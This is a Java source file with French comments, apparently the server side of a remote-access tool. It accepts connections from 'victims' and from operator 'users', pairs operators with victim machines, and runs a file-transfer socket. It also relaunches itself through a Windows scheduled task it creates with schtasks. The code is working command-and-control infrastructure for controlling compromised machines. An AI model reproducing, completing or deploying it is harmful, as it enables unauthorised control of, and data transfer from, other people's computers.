package Modele;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URISyntaxException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.ConcurrentModificationException;
import java.util.Date;
import java.util.HashMap;

import Controller.Main;
import Interfaces.Observable;
import Interfaces.ObservableUser;
import Interfaces.Observateur;
import Modele.Log.MoteurLog;


public class ServerStart implements Observateur{


	private ArrayList<Observable> listIdVictimsConnected;
	private ArrayList<Observable> listIdVictimsEnTransaction; //liste des victimes utilisées par des users (connectées à eux)
	private ArrayList<ObservableUser> listUsersConnected;
	private ArrayList<ConnexionEnvoiFichier> listConnexionEnvoiFichier;
	private ServerSocket sockServeurFichier;
	private MoteurLog moteurDeLog;
	
	private AttenteConnexionUser attenteUser ;
	private AttenteConnexionVictim attenteVictim ;
	
	
	private InetAddress IP;
	private int port_victime;
	private int pot_user;
	
	public ServerStart(InetAddress ip, int portUsers, int portVictims, String pathLog) {
	
				
		this.listUsersConnected = new ArrayList<ObservableUser>();
		this.listIdVictimsConnected = new ArrayList<Observable>();
		this.listIdVictimsEnTransaction = new ArrayList<Observable>();
		this.listConnexionEnvoiFichier = new  ArrayList<ConnexionEnvoiFichier>();
		try {
			this.sockServeurFichier = new ServerSocket(Main.PORT_Fichiers);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		this.moteurDeLog = new MoteurLog(pathLog);
		
		this.IP = ip;
		this.port_victime = portVictims;
		this.pot_user = portUsers;
		
		
		demarrageDuServeur();
		
		
	}
	
		

	private void demarrageDuServeur() {
		System.out.println("Lancement du serveur : Attente de connexions...");
		this.attenteUser = new AttenteConnexionUser(this, this.IP, this.pot_user);
		this.attenteVictim = new AttenteConnexionVictim(this, this.IP, this.port_victime);		
		this.attenteUser.start();
		this.attenteVictim.start();
	}

	//On a besoin du chemin du fichier executable jar pour faire redemarrer le serveur par le systeme
	public String redemarrageDuServeur(String pathJar) {
			
		
		if(!Main.osactu.equals(OS.windows)) {
			return "Le redemarrage n'a ete implemente que sur windows !";
		}
		

		
		
		try {
			String nomtache = "relance";
			
								
			int NowPlus = 1 ;
			Calendar temps = Calendar.getInstance();
			temps.add(Calendar.MINUTE, NowPlus);
			int minute = temps.get(Calendar.MINUTE);
			String heure = String.valueOf(temps.get(Calendar.HOUR_OF_DAY))+":"+(minute<10 ? "0" : "")+String.valueOf(minute);
			String commande = "cmd /c schtasks /Create /F /TN \""+nomtache+"\" /SC ONCE /ST "+heure+" /TR \"java -jar "+pathJar+"\"";
			System.out.println(commande);
			Process p = Runtime.getRuntime().exec(commande);
			System.exit(0);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			
		}
		
		return "le redemarrage du serveur a echoue";
		
	}
	


	private void purgerTousLesUtilisateurs() {
		
		boolean accesReussi = false;
		while(!accesReussi) {
			try {
				for (Observable victim : listIdVictimsConnected) {
					victim.disconnect();
				}
				accesReussi = true;
			}catch(ConcurrentModificationException e) {
				try {
					Thread.sleep(500);
				} catch (InterruptedException e1) {
					e1.printStackTrace();
				}
			}
		}
		accesReussi = false;
		while(!accesReussi) {
			try {
				for (Observable victim : listIdVictimsEnTransaction) {
					victim.disconnect();
				}
				accesReussi = true;
			}catch(ConcurrentModificationException e) {
				try {
					Thread.sleep(500);
				} catch (InterruptedException e1) {
					e1.printStackTrace();
				}
			}
		}		
		accesReussi = false;		
		while(!accesReussi) {
			try {
				for (ObservableUser user : listUsersConnected) {					
					user.disconnect();
				}
				accesReussi = true;
			}catch(ConcurrentModificationException e) {
				try {
					Thread.sleep(500);
				} catch (InterruptedException e1) {
					e1.printStackTrace();
				}
			}
		}
		
	}



	@Override
	public void updateConnection(Observable o) {
		this.listIdVictimsConnected.add(o);
		System.out.println("nb"+this.listIdVictimsConnected.size());
		this.moteurDeLog.EcrireNotificationLogINFO("Connexion reussie Victime id = "+o.getIdInstance());
	}

	@Override
	public void updateDisconnection(Observable o) {
		
		if(listIdVictimsConnected.contains(o)) {
			this.listIdVictimsConnected.remove(o);
			System.out.println("Deconnection d'une victime");
		}else if (listIdVictimsEnTransaction.contains(o)){
			System.out.println("Deconnection d'une victime");
			this.listIdVictimsEnTransaction.get(this.listIdVictimsEnTransaction.indexOf(o)).getUserConnecte().envoyerMessage("Victime deconnectee ! Retour dans le menu du serveur.");
			this.listIdVictimsEnTransaction.get(this.listIdVictimsEnTransaction.indexOf(o)).getUserConnecte().setConnecteAvecVictime(false);
			this.listIdVictimsEnTransaction.get(this.listIdVictimsEnTransaction.indexOf(o)).getUserConnecte().setVictimeConnecte(null);
			this.listIdVictimsEnTransaction.remove(o);
		} else {
			System.out.println("Echec de suppression de la victime dans les listes ");
		}
		
		
		
	}

	@Override
	public void updateConnectionUser(ObservableUser User) {
		this.listUsersConnected.add(User);
		this.moteurDeLog.EcrireNotificationLogINFO("Connection reussie User id = nonImplemente");
	}

	@Override
	public void updateDisconnectionUser(ObservableUser User) {
		if(User.getConnecteAvecVictime()) {
			PasserVictimeEnListeConnectee(User.getVictimeConnectee());
			User.getVictimeConnectee().setUserConnecte(null);
		}
		this.listUsersConnected.remove(User);		
		System.out.println("Deconnection d'un utilisateur");
	}
	
	

	@Override
	public ArrayList<Observable> getlistVictimsConnected() {
		return this.listIdVictimsConnected;
	}
	
	public ArrayList<Observable> getListIdVictimsEnTransaction() {
		return listIdVictimsEnTransaction;
	}
	
	@Override
	public ArrayList<Observable> getlistVictimsTransaction() {
		return this.listIdVictimsEnTransaction;
	}

	@Override
	public ArrayList<ObservableUser> getListUsersConnected() {
		return this.listUsersConnected;
	}
	
	public void PasserVictimeEnListeTransaction(Observable victim) {
		this.listIdVictimsEnTransaction.add(victim);
		this.listIdVictimsConnected.remove(victim);
	}
	
	public void PasserVictimeEnListeConnectee(Observable victim) {
		this.listIdVictimsConnected.add(victim);
		this.listIdVictimsEnTransaction.remove(victim);
	}
	
	public ArrayList<ConnexionEnvoiFichier> getListConnexionEnvoiFichier() {
		return listConnexionEnvoiFichier;
	}
		
	
	
	public void EteindreServeur() {
		//TODO NON IMPLEMENTÃ‰
	}



	@Override
	public ServerSocket getServeurSocketFichier() {
			
		return this.sockServeurFichier;
	}
	
	
}
